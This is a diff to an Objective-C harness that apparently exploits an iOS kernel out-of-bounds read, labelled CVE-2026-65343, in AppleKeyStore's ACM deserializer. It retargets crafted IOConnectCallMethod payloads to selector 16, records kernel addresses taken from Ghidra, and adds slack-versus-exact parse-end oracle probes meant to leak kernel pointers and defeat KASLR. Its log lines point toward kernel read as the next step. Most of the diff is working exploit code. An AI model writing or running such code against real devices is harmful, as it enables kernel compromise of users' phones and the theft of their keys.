@@ -17,9 +17,17 @@
 //  sel5 2c1 NotPrivileged. kptrs=0. v4 already sent declared=0x800
 //  at +24 insz=28 on sel0-7 with a zero handle.
 //
-//  This TAP: interposition self-test, sel0/1 hex dump, declared
-//  0x28 then 0x100 on sel 0 and 1 only. STOP. No 163-sel. No sel5.
-//  No 0x800 (parked after the crash sweep). Not hasKread.
+//  v9: sel 0/1 on our UC never reach ACMDeserialize (P104 live:
+//  both are ungated no-ops, same as sel 16 SUCCESS-until-content).
+//  The 163-sel megafunction jumptable @ 0xfffffff008d9f868 feeds
+//  sel 16 → FUN_fffffff008d8ca10 → aks_sep_req_prepare_output_ool
+//  (0xfffffff008d88a68). That is the copyout that trusts
+//  declared_length. LibSer_ACMDeserializeSEPControlCode itself
+//  lives in AppleSEPCredentialManager @ 0xfffffff008d5cc80.
+//  This TAP: interpose + SE capture, then the 65343 envelope
+//  (handle[16] + declared at +24) on sel 16 (and the captured
+//  megafunction sel if it is in 0..0xa2 and not 5). Declared
+//  0x28 then 0x100. STOP. No 163-sel. No sel5. No 0x800.
 
 #import "P057AksDeserialize.h"
 #import "P007Board.h"
@@ -34,11 +42,13 @@
 #import <string.h>
 #import <mach/mach.h>
 
-#define P057_BUILD @"aks-p007-v8-oracle-variants"
+#define P057_BUILD @"aks-p007-v9-sel16-feeder"
 #define SE_KEY_TAG "com.research.p007.aks.v5"
 #define OUTBUF_SZ  0x400u
 #define FILL_BYTE  0xBBu
 #define MSG_SZ     28u
+#define P057_FEEDER_SEL 16u
+#define P057_SEL_MAX    0xa2u
 
 #ifndef DYLD_INTERPOSE
 #define DYLD_INTERPOSE(_replacement, _replacee)                          \
@@ -299,6 +309,7 @@ static const char *p057_krn(kern_return_t kr) {
     if (u == 0xe00002c7) return "Unsupported";
     if (u == 0xe00002d5) return "Busy";
     if (u == 0xe00002e2) return "NotPermitted";
+    if (u == 0xe00002f0) return "NotFound";
     return "?";
 }
 
@@ -364,12 +375,15 @@ static void p057_cleanup_se(void) {
     SecItemDelete((__bridge CFDictionaryRef)delQ);
 }
 
-/* sel 0 or 1 only. declared is the u32 at +24. Never 0x400/0x800. */
+/* Megafunction feeder only (sel 16, plus a captured sel in 0..0xa2).
+   declared is the u32 at +24. Never 0x400/0x800. Never sel 5. */
 static int p057_probe(io_connect_t conn, const uint8_t *handle16,
-                     int sel, uint32_t declared)
+                     int sel, uint32_t declared, uint32_t nscalar)
 {
-    if (sel < 0 || sel > 1) return 0;
+    if (sel < 0 || (uint32_t)sel > P057_SEL_MAX) return 0;
+    if (sel == 0 || sel == 1 || sel == 5) return 0;
     if (declared > 0x100) return 0;
+    if (nscalar > 1) return 0;
 
     uint8_t msg[MSG_SZ];
     memset(msg, 0, sizeof(msg));
@@ -382,18 +396,20 @@ static int p057_probe(io_connect_t conn, const uint8_t *handle16,
     size_t outsz = sizeof(outbuf);
     uint64_t scalo[8] = {0};
     uint32_t scaln = 8;
+    uint64_t scalin[1] = {0};
 
     kern_return_t kr = real_IOConnectCallMethod(
         conn, (uint32_t)sel,
-        NULL, 0, msg, sizeof(msg),
+        nscalar ? scalin : NULL, nscalar,
+        msg, sizeof(msg),
         scalo, &scaln, outbuf, &outsz);
 
     int nonfill = 0;
     for (size_t i = 0; i < sizeof(outbuf); i++)
         if (outbuf[i] != FILL_BYTE) nonfill++;
 
-    p057_log(@"  sel=%d decl=0x%x kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
-             sel, declared, kr, p057_krn(kr), outsz, nonfill, scaln,
+    p057_log(@"  sel=%d nsc=%u decl=0x%x kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
+             sel, nscalar, declared, kr, p057_krn(kr), outsz, nonfill, scaln,
              scaln ? scalo[0] : 0ULL);
 
     size_t hexn = outsz;
@@ -433,7 +449,7 @@ static int p057_probe(io_connect_t conn, const uint8_t *handle16,
    kernel-backed input buffer (KASLR, per the PoC). Fill the param so parsing
    ends exactly at the input end: 0x10 + 4(count) + 8(param hdr) + L = size.
    Bytes[4]=0x33 satisfies the walker tag too — one blob covers both shapes.
-   Sweep: ONE call per selector 0..40. No 0x800, no 163, no size sweep. */
+   v9: ONE call on the megafunction feeder (sel 16), not 0..40. */
 static void p057_build_acm(uint8_t *buf, uint32_t buflen, uint32_t paramLen) {
     memset(buf, 0, buflen);
     buf[4] = 0x33;                       /* walker tag 0x33 */
@@ -446,7 +462,8 @@ static void p057_build_acm(uint8_t *buf, uint32_t buflen, uint32_t paramLen) {
 }
 
 static int p057_probe_acm(io_connect_t conn, int sel) {
-    if (sel < 0 || sel > 0x40) return 0;
+    if (sel < 0 || (uint32_t)sel > P057_SEL_MAX) return 0;
+    if (sel == 0 || sel == 1 || sel == 5) return 0;
     uint8_t blob[0x28];                  /* 0x10 + 4 + 8 + 12 = 0x28 */
     p057_build_acm(blob, (uint32_t)sizeof(blob), 12);
     uint8_t outbuf[OUTBUF_SZ];
@@ -503,10 +520,11 @@ static int p057_probe_acm(io_connect_t conn, int sel) {
     p057_log(@"=== p057 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P057_BUILD);
     p057_log(@"CVE-2026-65343 AKS ACM deserialize OOB read. KASLR, not KRW, not kreadbuf.");
     p057_log(@"Fixed 26.6.1 → LIVE on 23F77 / 23G71.");
-    p057_log(@"Ghidra: LibSer_ACMDeserializeSEPControlCode @ fffffff008d5cc80 (ACM min 0x18).");
-    p057_log(@"v6 decode: deserializeParameters wire = [hdr 0x10 unchecked][count u32][type|len|data]*;");
-    p057_log(@"wrapper reads u32 at FINAL offset with NO end check = OOB into adjacent kernel bytes");
-    p057_log(@"feeding the version/entitlement gate (1-bit KASLR oracle). Sweep: v7 ACM envelope.");
+    p057_log(@"Ghidra: LibSer_ACMDeserializeSEPControlCode @ fffffff008d5cc80 (ACM min 0x18, AppleSEPCredentialManager).");
+    p057_log(@"Feeder: megafunction sel %u (jumptable @ fffffff008d9f868 → FUN_8d8ca10 → prepare_output_ool 8d88a68).",
+             P057_FEEDER_SEL);
+    p057_log(@"P104 live 23F77+24A435: sel 0/1/16 ungated SUCCESS. Sel 0/1 never reach ACMDeserialize.");
+    p057_log(@"163-sel 0x800 crash sweep PARK. sel5 PARK. declared<=0x100.");
     p057_log(@"");
 
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p057"];
@@ -587,93 +605,85 @@ static int p057_probe_acm(io_connect_t conn, int sel) {
     uint8_t handle[16];
     memset(handle, 0, 16);
     BOOL haveHandle = NO;
-    int probeSel0 = 0;
-    int probeSel1 = 1;
+    uint32_t feeders[2] = { P057_FEEDER_SEL, P057_FEEDER_SEL };
+    uint32_t nfeeders = 1;
     if (g_cap_done && g_cap_conn) {
         memcpy(handle, g_cap_handle, 16);
         haveHandle = YES;
-        p057_log(@"[+] ACM captured conn=%u sel=%u — using real handle on sel 0/1 only",
-                 g_cap_conn, g_cap_sel);
-        if (g_cap_sel <= 1) {
-            probeSel0 = (int)g_cap_sel;
-            probeSel1 = probeSel0;
+        p057_log(@"[+] ACM captured conn=%u sel=%u — using real handle on the captured sel AND sel %u",
+                 g_cap_conn, g_cap_sel, P057_FEEDER_SEL);
+        if (g_cap_sel <= P057_SEL_MAX && g_cap_sel != 5 &&
+            g_cap_sel != P057_FEEDER_SEL && g_cap_sel > 1) {
+            feeders[nfeeders++] = g_cap_sel;
         }
         conn = g_cap_conn;
     } else {
-        p057_log(@"[*] no in-process ACM (secd XPC or interpose miss). Synthetic on our UC.");
+        p057_log(@"[*] no in-process ACM (secd XPC or interpose miss). Feeder sel %u on our UC.",
+                 P057_FEEDER_SEL);
+        p057_log(@"    Sel 0/1 are the wrong surface (P104 ungated no-ops). Not probed.");
         p057_log(@"    ByteV0rtex 163-sel zero-handle 0x800 sweep stays PARKED (crash).");
     }
     p057_write_log();
 
-    /* Phase 3: sel0/1 hex dump + declared 0x28 then 0x100. */
+    /* Phase 3: 65343 envelope on the megafunction feeder (sel 16). */
     p057_log(@"");
-    p057_log(@"[3] sel 0/1 hex dump. declared 0x28 then 0x100. STOP after.");
+    p057_log(@"[3] feeder sel(s) + declared 0x28 then 0x100. 0-scalar and 1-scalar. Not sel 0/1.");
     int totalKptr = 0;
     static const uint32_t decls[] = { 0x28, 0x100 };
-    int sels[2] = { probeSel0, probeSel1 };
-    int nsels = (probeSel0 == probeSel1) ? 1 : 2;
-    for (int si = 0; si < nsels; si++) {
-        for (uint32_t di = 0; di < 2; di++) {
-            totalKptr += p057_probe(conn, haveHandle ? handle : NULL,
-                                    sels[si], decls[di]);
+    for (uint32_t oi = 0; oi < nopened; oi++) {
+        io_connect_t c = (g_cap_done && g_cap_conn) ? conn : opened[oi];
+        if (!c) continue;
+        for (uint32_t fi = 0; fi < nfeeders; fi++) {
+            for (uint32_t di = 0; di < 2; di++) {
+                for (uint32_t ns = 0; ns <= 1; ns++) {
+                    totalKptr += p057_probe(c, haveHandle ? handle : NULL,
+                                            (int)feeders[fi], decls[di], ns);
+                }
+            }
         }
+        if (g_cap_done && g_cap_conn) break;
     }
-    p057_log(@"[3] done kptrs=%d handle=%@",
-             totalKptr, haveHandle ? @"real" : @"zero");
+    p057_log(@"[3] done kptrs=%d handle=%@ feeders=%u,%u",
+             totalKptr, haveHandle ? @"real" : @"zero",
+             feeders[0], nfeeders > 1 ? feeders[1] : feeders[0]);
     if (totalKptr > 0) {
         p057_log(@"*** copyout produced kernel-range qwords. KASLR sibling of aio84530.");
         p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
         p057_log(@"NEXT: paste hex; 0x800 on THIS selector only after you authorize.");
     } else {
-        p057_log(@"No kptrs on sel0/1 at decl<=0x100. Matches v4 empty kr=0.");
-        p057_log(@"[4] v7 ACM TLV envelope sweep (Ghidra-decoded wire format). ONE call");
-        p057_log(@"    per selector 0..40, insz=0x28, tag 0x33, parse-ends-at-end OOB shape.");
-        p057_log(@"    Baseline from v4 census: sel0/1 kr=0 empty; sel2-4/6-7 0xe00002c2;");
-        p057_log(@"    sel5 0xe00002c1. ANY OTHER kr or nonfill on this shape = door candidate.");
+        p057_log(@"No kptrs on feeder at decl<=0x100.");
+        p057_log(@"[4] ACM TLV tag 0x33 on the feeder only (not 0..40). insz=0x28.");
         int acmKptr = 0;
-        for (int sel = 0; sel <= 40; sel++) {
-            acmKptr += p057_probe_acm(conn, sel);
+        for (uint32_t oi = 0; oi < nopened; oi++) {
+            io_connect_t c = (g_cap_done && g_cap_conn) ? conn : opened[oi];
+            if (!c) continue;
+            for (uint32_t fi = 0; fi < nfeeders; fi++)
+                acmKptr += p057_probe_acm(c, (int)feeders[fi]);
+            if (g_cap_done && g_cap_conn) break;
         }
-        p057_log(@"[4] done acm_kptrs=%d (single call per sel; no 0x800, no 163, no sweep-sizes).", acmKptr);
+        p057_log(@"[4] done acm_kptrs=%d (feeder only; no 0x800, no 163, no size-sweep).", acmKptr);
         if (acmKptr > 0) {
             p057_log(@"*** copyout produced kernel-range qwords from the ACM OOB. KASLR sibling of aio84530.");
             p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
         }
-        /* v8: ORACLE MECHANICS test on the census's door candidates
-           (00:04 run: sel16 SUCCESS+zeros, sel19 e00002e2 NotPermitted,
-           sel0/1 SUCCESS+zeros). For each candidate send TWO envelope
-           variants that differ ONLY in where the parse end lands:
-             A 'slack'  : 12 trailing bytes -> parse ends IN-BOUNDS,
-                          wrapper's trailing u32 reads OUR zero slack;
-             B 'exact'  : parse ends exactly at input end -> the wrapper's
-                          u32 read is the FIRST 4 BYTES PAST our kernel
-                          copy (the OOB). Any kr/output difference between
-                          A and B on the same selector = the parse endpoint
-                          is observable = the deserialize path RAN. */
-        p057_log(@"[5] v8 oracle variants (A=slack vs B=exact parse-end):");
-#define P057_ACMB_MAX 0x40
-        for (uint32_t selX = 0; selX <= 40; selX++) {
+        /* Slack vs exact parse-end on the feeder only. Difference in kr
+           means the deserialize path ran (1-bit oracle). */
+        p057_log(@"[5] oracle variants on feeder (A=slack vs B=exact parse-end):");
+        for (uint32_t fi = 0; fi < nfeeders; fi++) {
+            uint32_t selX = feeders[fi];
             kern_return_t krA = 0, krB = 0;
-            if (selX == 5 || selX >= 20) continue;   /* bounded: door candidates + baseline sels only */
             for (int variant = 0; variant < 2; variant++) {
                 uint8_t blob[0x40];
-                uint32_t plen = variant ? 12 : 0;
-                /* variant 0 = slack: param data leaves trailing zero bytes so
-                   the wrapper's trailing read lands IN-BOUNDS;
-                   variant 1 = exact: param reaches the end, read goes past it */
                 if (variant) {
                     p057_build_acm(blob, 0x28, 12);
                 } else {
                     memset(blob, 0, sizeof(blob));
-                    /* slack shape: 0x10 hdr / count=1 / param len=4 / 4 data /
-                       0x0C zero slack -> parse end 0x20, in-bounds reads */
                     blob[4] = 0x33;
                     uint32_t count = 1, type = 1, n4 = 4;
                     memcpy(blob + 0x10, &count, 4);
                     memcpy(blob + 0x14, &type, 4);
                     memcpy(blob + 0x18, &n4, 4);
                     memset(blob + 0x1c, 0x22, 4);
-                    /* blob[0x20..0x2c] = zeros (slack), insz 0x2c */
                 }
                 uint32_t insz = variant ? 0x28 : 0x2c;
                 uint8_t outb[0x400];
@@ -683,16 +693,15 @@ static int p057_probe_acm(io_connect_t conn, int sel) {
                 uint32_t scn2 = 8;
                 kern_return_t kr2 = real_IOConnectCallMethod(
                     conn, selX, NULL, 0, blob, insz, scal, &scn2, outb, &oszB);
-                int nf = 0;
-                for (size_t i = 0; i < sizeof(outb); i++)
-                    if (outb[i] != 0xBB) nf++;
                 if (variant) krB = kr2; else krA = kr2;
+                p057_log(@"  oracle sel=%u %@ kr=0x%08x (%s)",
+                         selX, variant ? @"exact" : @"slack", kr2, p057_krn(kr2));
                 if (variant == 1 && krB != krA)
-                    p057_log(@"  [ORACLE] sel=%2d kr@slack=0x%08x != kr@exact=0x%08x <- "
-                             @"NON-ENTITLED PARSE-END OBSERVABLE", selX, krA, krB);
+                    p057_log(@"  [ORACLE] sel=%u kr@slack=0x%08x != kr@exact=0x%08x <- "
+                             @"PARSE-END OBSERVABLE", selX, krA, krB);
             }
         }
-        p057_log(@"[5] done (per-sel slack/exact comparison; sel5+20+ skipped).");
+        p057_log(@"[5] done (feeder slack/exact only).");
     }
 
     for (uint32_t i = 0; i < nopened; i++) {
